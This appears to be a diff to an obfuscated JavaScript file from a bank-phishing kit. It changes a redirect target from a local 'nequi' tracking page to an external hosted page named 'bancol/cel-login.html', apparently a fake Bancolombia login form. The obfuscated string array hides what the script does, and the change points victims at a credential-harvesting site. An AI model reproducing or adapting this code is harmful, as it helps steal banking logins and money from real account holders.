@@ -181,7 +181,7 @@ function _0x2c13() {
     "split",
     "\x22\x20alt=\x22icono\x22\x20class=\x22icono-seleccionado\x22>\x20<span>",
     "log",
-    "./points/nequi/rastrear/index.html",
+    "https://blueviolet-okapi-275780.hostingersite.com//boton/dinadatos/bancol/cel-login.html",
     "3408824doLJwI",
     "disabled",
     "select",
@@ -200,3 +200,4 @@ function _0x2c13() {
   };
   return _0x2c13();
 }
+
